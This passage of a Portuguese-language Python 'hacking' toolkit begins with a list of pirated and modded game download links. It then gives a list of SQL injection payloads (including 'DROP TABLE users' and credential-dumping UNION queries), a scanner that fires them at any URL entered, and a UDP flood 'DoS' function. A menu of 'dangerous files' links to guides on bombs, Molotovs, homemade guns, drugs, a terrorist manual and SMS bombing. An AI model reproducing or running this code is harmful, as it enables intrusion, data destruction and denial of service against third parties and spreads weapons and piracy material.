Minecraft 1.21.80 🔥🔥: https://upload.app/download/minecraft/com.mojang.minecraftpe/4e24fe51c065a2133366fa1689b3ada933c5c2b0b98bfa902a8d5b1ed9adbe7f?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=8163

Ark Mobile (Jogo de Dinossauro) 🔥🔥: https://d.apkpure.com/b/XAPK/com.studiowildcard.arkuse?version=latest

Hello Neighbour 🔥: https://d.apkpure.com/b/XAPK/com.tinybuildgames.helloneighbor?version=latest

Good Pizza Great Pizza! 🔥: https://d.apkpure.com/b/APK/com.tapblaze.pizzabusiness?version=latest

NARUTO: Ultimate Ninja STORM 1.2.6 (Download Gratuito, Recursos Ilimitados) 🔥🔥: https://upload.app/download/naruto-ultimate-ninja-storm/com.bandainamcoent.ultimateninjastorm/d1f9ef499d189872d69100e98a90d6196e34a8077b4be759fb135d6b313fd713?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=8140

Drift Max 15.4 (Dinheiro Ilimitado) 🔥: https://upload.app/download/drift-max/tr.com.tiramisu.driftmax/4ee62a5b90a2d2660fb020af907c62b491f6126db6a1a6217ba0ea0824bae8e7?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=8140

Car Parking Multiplayer Mod APK 4.9.2: https://upload.app/download/car-parking/com.olzhas.carparking.multyplayer/3d8e59f934c3c87a4b8481201c92663c1fb32a43ae78570bc9a0c05b4d23650d?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=8145

Soul Knight: https://upload.app/download/soul-knight/com.ChillyRoom.DungeonShooter/24577dd6896d9fb1564c92d9c45b620de9a98a12ab54b2b4a407d15a99e3ac4f?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=8144

Hello Neighbour Nicky´s Diaries: https://upload.app/download/hello-neighbor-nicky-s-diaries/com.tinybuildgames.hndiaries/8ccebeea6041243548e60d3fd96a2742df60b5796ba674401c8f6a0d49b25228?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=8056

PPSSPP Gold 🔥🔥: https://files.an1.net/ppsspp-gold_1.18.1-an1.com.apk

The Walking Zombie 2: Shooter 🔥: https://upload.app/download/the-walking-zombie-2/com.aldagames.zombieshooter/9f7ad3830710c9801cc7114bee91e513fe46f72b3cd4a009ba12cc7841832195?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7990

Melon Sandbox APK 28.5.1 🔥: https://apkpure.com/br/melon-sandbox/com.studio27.MelonPlayground?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7959

Dude Theft Wars (GTA de baixa qualidade) 🔥: https://upload.app/download/dude-theft-wars/com.PoxelStudios.DudeTheftAuto/0f561269fb2d053b8ff3a81778b2f1524a8643f392bdd9981c50e1bc49b33e3c?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7958

Universal Truck Simulator: https://upload.app/download/universal-truck-simulator/com.dualcarbon.universaltrucksimulator/b4d84143e9b018b0576e0b6b5f4bde107051d102821425b4a587d1256c97b88c?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7885

House Flipper 🔥: https://upload.app/download/house-flipper/com.imaginalis.HouseFlipperMobile/fa37df13ae37e5418b0bf43aac4cdc270710c8e48c5da0c6217701704c343943?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7815

Block Blast! : https://upload.app/download/block-blast/com.block.juggle/00a1fe556427943c44606a309d582f6f15e1c807c68ae1e94a4e07a9a78b276b?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7800

Bright Memory: Infinite 🔥: https://upload.app/download/bright-memory-infinite/com.FYQD.BMI/54c47c90e364dc399e2d0da54a991731da7ea234040fc5a31a31456db162bbe9?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7798

KRNL Executor (Roblox) 🔥🔥: https://upload.app/download/krnl-executor/com.roblox.client/9ed3e8edb5b0fc1de33f2ceebffdd9600d4b2fc56f1c47dcea787a1157d0e490?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7762

Digging a Hole simulator 🔥: https://upload.app/download/digging-a-hole-simulator/com.youngster.hole/a7fc4125b2f648dda468bdb9adc06d5159ba79d1246dcdf5cd3cbb82f113ced6?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7706

R.E.P.O Mobile 🔥: https://upload.app/download/r-e-p-o-mobile/com.sandswept.repo/a6ec024be61927b6b2de18417e2b13fc0226bebfa0c9df5c589589f8c5fabf9f?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7701

Chicken Gun: https://upload.app/download/chicken-gun/com.chaloapps.roosterrudy/02bbeb5d53d1d3e2c9efc19607fa09484638174a3cf72d495a819b84cad5ce72?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7687

GTA San Andreas - The Definitive Edition 🔥🔥🔥: https://gofile.io/d/Frs5N0?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=8155

Tekken 8 🔥🔥: https://gofile.io/d/I9opk8?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=7091

Fifa 23 🔥: https://gofile.io/d/weT7jM?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=6785

Palworld 🔥🔥: https://gofile.io/d/D2ZMrz?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=6594

Far Cry 6 🔥🔥🔥: https://gofile.io/d/5WzB4a?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=6803

Forza Horizon 5 🔥🔥🔥: https://gofile.io/d/QaJLW5?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=6840

Dragon Ball: Sparking Zero 🔥🔥: https://gofile.io/d/ARmFuX?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=6840

 Marvel’s Spider-Man: Miles Morales 🔥🔥: https://gofile.io/d/YdXO3l?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=7099

Marvel´s Spider man - Remastered 🔥🔥: https://gofile.io/d/A8o86m?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=8077

The Last of Us Part II 🔥: https://gofile.io/d/3FylJR?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=8155

Five Nights at Freddy’s: Into the Pit 🔥🔥: https://gofile.io/d/8XC18b?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=8077

Stray 🔥🔥: https://gofile.io/d/Wi0L2S?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=8077

          
(Quanto mais foguinho melhor o jogo)
          
""")
    backmenu()

payloads = [
    "' OR '1'='1' -- ",
    "' OR '1'='1' /* ",
    "' OR '1'='1' # ",
    "' OR '1'='1' AND ''='' ",
    "' AND 1=CONVERT(int, (SELECT @@version)) -- ",
    "' AND 1=2 -- ",
    "' AND (SELECT COUNT(*) FROM users) > 0 -- ",
    "' UNION SELECT NULL, username, password FROM users -- ",
    "' UNION SELECT 1, 'test', 'test' -- ",
    "' UNION SELECT 1, database(), user() -- ",
    "' OR IF(1=1, SLEEP(5), 0) -- ",
    "' OR IF(1=2, SLEEP(5), 0) -- ",
    "' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 0 -- ",
    "' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a' -- ",
    "' AND 'a'='a' -- ",
    "' AND 'a'='b' -- ",
    "'; DROP TABLE users; -- ",
    "'; SELECT * FROM users; -- ",
    "' OR '1'='1' /* comment */ ",
    "' OR '1'='1' -- comment"
]

def sqliscan():
    url = input("[+] Insira a URL(exemplo: http://example.com/page.php): ").lower()
    if url.startswith("https://") or url.startswith('http://'):
        for payload in payloads:
            try:
                urlsql = f"{url}?id={payload}"
                response = requests.get(urlsql)
                if "sql" in response.text.lower() or "error" in response.text.lower():
                    print(Fore.LIGHTGREEN_EX + f"[+] Vulnerabilidade encontrada em: {urlsql}")
                    print(Fore.LIGHTWHITE_EX + "\r")
                else:
                    print("\r")
            except requests.RequestException as e:
                print(Fore.LIGHTRED_EX + f"[+] Erro ao tentar contato com a url: {url} , Erro: {e}")
                print(Fore.LIGHTWHITE_EX + f"\r")
    else:
        print(Fore.LIGHTRED_EX + "[+] Insira uma url válida!")
        print(Fore.LIGHTWHITE_EX + "\r")
    backmenu()

def domainlookupres():
    site = input("[+] Insira o domínio: ")
    try:
        siteinfo = whois.whois(site)
        print(f"[+] Mostrando informações para: {site}")
        print(f"[+] Nome do domínio: {siteinfo.name}")
        print(f"[+] Registrar: {siteinfo.registrar}")
        print(f"[+] Data de criação: {siteinfo.creation_date}")
        print(f"[+] Data de expiração: {siteinfo.expiration_date}")
        print(f"[+] Status: {siteinfo.status}")
        backmenu()
    except Exception as e:
        print(f"[+] Erro ao consultar o domínio {site}, Erro: {e}.")
        backmenu()

def ddos(target):
    bytesend = random._urandom(9999)
    targetip = target.split()[0]
    if targetip.endswith((".com", ".net", ".gov", ".br", ".org")):
        targetip = socket.gethostbyname(targetip)
    targetport = int(target.split()[1])
    numpackets = int(target.split()[2])
    sent = 0
    for i in range(numpackets):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytesend, (targetip, targetport))
        sent += 1
        print(f"[+] Packet {sent} enviado ao IP: {targetip} pela Porta: {targetport}")
    print(f"\n[+] Ataque DoS finalizado com um total de {sent} packets enviados.")
    backmenu()

def gerardadosfic():
    numdados = int(input("[+] Quantos dados gerar? "))
    faker = Faker()
    generolista = ["MASCULINO", "FEMININO"]
    cor = ['BRANCA', 'PRETA', 'PARDA', 'VERMELHA', 'AMARELA']
    ddd = [
    11,  # São Paulo
    12,  # São Paulo
    13,  # São Paulo
    14,  # São Paulo
    15,  # São Paulo
    16,  # São Paulo
    17,  # São Paulo
    18,  # São Paulo
    19,  # São Paulo
    21,  # Rio de Janeiro
    22,  # Rio de Janeiro
    24,  # Rio de Janeiro
    27,  # Espírito Santo
    28,  # Espírito Santo
    31,  # Minas Gerais
    32,  # Minas Gerais
    33,  # Minas Gerais
    34,  # Minas Gerais
    35,  # Minas Gerais
    37,  # Minas Gerais
    38,  # Minas Gerais
    41,  # Paraná
    42,  # Paraná
    43,  # Paraná
    44,  # Paraná
    45,  # Paraná
    46,  # Paraná
    47,  # Santa Catarina
    48,  # Santa Catarina
    49,  # Santa Catarina
    51,  # Rio Grande do Sul
    53,  # Rio Grande do Sul
    54,  # Rio Grande do Sul
    55,  # Rio Grande do Sul
    61,  # Distrito Federal
    62,  # Goiás
    63,  # Tocantins
    64,  # Goiás
    65,  # Mato Grosso
    66,  # Mato Grosso
    67,  # Mato Grosso do Sul
    68,  # Acre
    69,  # Rondônia
    71,  # Bahia
    73,  # Bahia
    74,  # Bahia
    75,  # Bahia
    77,  # Bahia
    79,  # Sergipe
    81,  # Pernambuco
    82,  # Alagoas
    83,  # Paraíba
    84,  # Rio Grande do Norte
    85,  # Ceará
    86,  # Piauí
    87,  # Pernambuco
    88,  # Ceará
    89,  # Piauí
    91,  # Pará
    92,  # Amazonas
    93,  # Pará
    94,  # Pará
    95,  # Roraima
    96,  # Amapá
    97,  # Amazonas
    98,  # Maranhão
    99   # Maranhão
]
    for i in range(numdados):
        telefonestr = f"({random.choice(ddd)}) {random.randint(0000, 99999)}-{random.randint(0000, 9999)}"
        nome = faker.name()
        genero = random.choice(generolista)
        datadenascimento = faker.date_of_birth()
        coraca = random.choice(cor)
        municipionasc = faker.city()
        telefone = telefonestr
        endereço = faker.address()
        print(Fore.LIGHTRED_EX + f"""
        ======================================
        Nome: {nome}
        Sexo: {genero}
        Data de Nascimento: {datadenascimento}
        Raça: {coraca}
        Município de Nascimento: {municipionasc}
        Telefone: {telefone}
        Endereço: {endereço}
        ======================================""")
    print(Fore.LIGHTWHITE_EX + "\r")
    backmenu()
    

def linksper():
    print("""
                Arquivos 📂 perigosos

VPN Ilimitada para android: https://t.me/undergrupo/62585

SMS Bomber Android: https://t.me/undergrupo/62569

Drogas Caseiras: https://t.me/undergrupo/46484

Bombas: https://t.me/undergrupo/46488

Dorks: https://t.me/undergrupo/46480

Como não ser rastreado: https://t.me/undergrupo/46473

Como fazer Molotov: https://t.me/undergrupo/50418

Manual do Terrorista BR (Use com responsabilidade): https://t.me/undergrupo/50415

Como pegar Kit Bico: https://t.me/undergrupo/43513

Como virar saldo: https://t.me/undergrupo/43511

Armas Caseiras (Pistola automática): https://t.me/undergrupo/43510

Armas Caseiras (Pistola): https://t.me/undergrupo/43509

Armas Caseiras (Shotgun): https://t.me/undergrupo/43508

Armas Caseiras (Submetralhadora): https://t.me/undergrupo/43507

Curso Hacking (Inglês): https://t.me/undergrupo/63617
          
""")
    backmenu()

def dadosver():
    num = input("[+] Insira um número (máx. 41): ")
    if num in dados:
        print(Fore.LIGHTRED_EX + f"{dados[num].strip()}")
        print(Fore.LIGHTWHITE_EX + "\n")
    else:
        print(f"[+] Não consegui encontrar o dado '{num}' em nosso banco de dados")
    backmenu()
        
def startddos():
    iportnum = input("[+] Insira o IP ou site, a porta e o número de packets (exemplo: 192.168.1.1 443 1000) ")
    ddos(iportnum)

def iplookresult():
    ip = input("[+] Insira o IP: ")
    dados = iplookup(ip)
    if dados:
        print(f"[+] Dados sobre o ip: {ip}")
        print(f"[+] Cidade: {dados.get("city")}")
        print(f"[+] Estado: {dados.get("region")}")
        print(f"[+] País: {dados.get("country")}")
        print(f"[+] Localização: {dados.get("loc")}")
        print(f"[+] Organização: {dados.get("org")}")
        print(f"[+] Código Postal: {dados.get("postal")}")
        print(f"[+] Fuso Horário: {dados.get("timezone")}")
        backmenu()
    else:
        print(Fore.LIGHTRED_EX + f"[+] Erro ao consultar o IP: {ip}")
        print(Fore.RESET + "\r")
        backmenu()

def ipbyurl(site):
    if site.endswith((".com", ".br", ".org", ".net", ".gov")):
        try:
            ip = socket.gethostbyname(site)
            return ip
        except Exception as e:
            return None
    else:
        return f"[+] Não foi possível retornar o ip da url: {site}"
    
def ipbyurlres():
    site = input("[+] Insira a URL: ")
    resultado = ipbyurl(site)
    print(f"[+] O IP de {site} é {resultado}")
    backmenu()

def banner():
    print(Fore.LIGHTWHITE_EX + """
                 ██████╗ ██╗     ██╗  ██╗ ██████╗     ███████╗████████╗███████╗██████╗ ███╗   ██╗ ██████╗ 
                ██╔═══██╗██║     ██║  ██║██╔═══██╗    ██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗  ██║██╔═══██╗
                ██║   ██║██║     ███████║██║   ██║    █████╗     ██║   █████╗  ██████╔╝██╔██╗ ██║██║   ██║
                ██║   ██║██║     ██╔══██║██║   ██║    ██╔══╝     ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██║   ██║
                ╚██████╔╝███████╗██║  ██║╚██████╔╝    ███████╗   ██║   ███████╗██║  ██║██║ ╚████║╚██████╔╝
                 ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                                          

                Feito por: Berkxp
                github do criador: https://github.com/Berkxp                                                                                                    

""")

def menuhacking():
    while True:
        if sistema == "Windows":
            os.system("cls")
        else:
            os.system("clear")
        print("""
                                                 ______________________________
                                                |                              |
                                                |────[1] SqlI Scan             |
                                                |                              |
                                                |────[2] DoS                   |
                                                |                              |
                                                |────[3] IP by URL             |
                                                |                              |
                                                |────[4] IP Lookup             |
                                                |                              |
                                                |────[5] Domain Lookup         |
                                                |                              |
                                                |────[0] Voltar ao menu        |
                                                |                              |
                                                |────[Q] Quit                  |
                                                |______________________________|
""")
        option = input("[+] Qual opção? ").lower()
        if option == "1" or option == "01": sqliscan()
        elif option == "2" or option == "02": startddos()
        elif option == "3" or option == "03": ipbyurlres()
        elif option == "4" or option == "04": iplookresult()
        elif option == "5" or option == "05": domainlookupres()
        elif option == "0" or option == "00": menu()
        elif option == "q" or option == "Q":
            if sistema == "Windows":
                os.system("cls")
            else:
                os.system("clear")
            exit()
        else:
            print("[+] Opção Inválida")
            time.sleep(1)
            menuhacking()

def links():
    while True:
        if sistema == "Windows":
            os.system("cls")
        else:
            os.system("clear")
        banner()
        print("""
                                                 ______________________________
                                                |                              |
                                                |────[1] Links Perigosos       |
                                                |                              |
                                                |────[2] Links de Jogos        |
                                                |                              |
                                                |────[0] Voltar ao Menu        |
                                                |                              |
                                                |────[Q] Quit                  |
                                                |______________________________|
""")
        option = input("[+] Qual opção? ")
        if option == "1" or option == "01": linksper()
        elif option == "2" or option == "02": linksjogos()
        elif option == "0" or option == "00": menu()
        elif option == "2" or option == "02": os.system("clear"), exit()
        else:
            print("[+] Opção Inválida")
            time.sleep(1)
            links()


def menu():
    while True:
        if sistema == 'Windows':
            os.system("cls")
        else:
            os.system('clear')
        banner()
        print("""
                                             ______________________________
                                            |                              |
                                            |────[1] Dados                 |
                                            |                              |
                                            |────[2] Hacking               |
                                            |                              |
                                            |────[3] Links                 |
                                            |                              |
                                            |────[Q] Quit                  |
                                            |______________________________|
                            

""")
        print(Fore.LIGHTWHITE_EX + "\r")
        option = input("[+] Qual opção? ")
        if option == "1" or option == "01":
            print("""
                                             ______________________________          
                                            |                              |
                                            |────[1] Dados Pessoais BR     |
                                            |                              |
                                            |────[2] Gerar Dados Fictícios |
                                            |                              |
                                            |────[0] Voltar ao menu        |
                                            |                              |
                                            |────[Q] Quit                  |
                                            |______________________________|
                                            
""")
            optiondados = input("[+] Qual opção? ").lower()
            if optiondados == "1" or optiondados == "01": dadosver()
            elif optiondados == "2" or optiondados == "02": gerardadosfic()
            elif optiondados == "0" or optiondados == "00": menu()
            elif optiondados == "q": os.system("clear"), exit()
            else:
                print("[+] Opção Inválida")
                time.sleep(1)
                menu()
        elif option == "2" or option == "02": menuhacking()
        elif option == "3" or option == "03": links()
        else:
            print("[+] Opção Inválida")
            time.sleep(1)
            menu()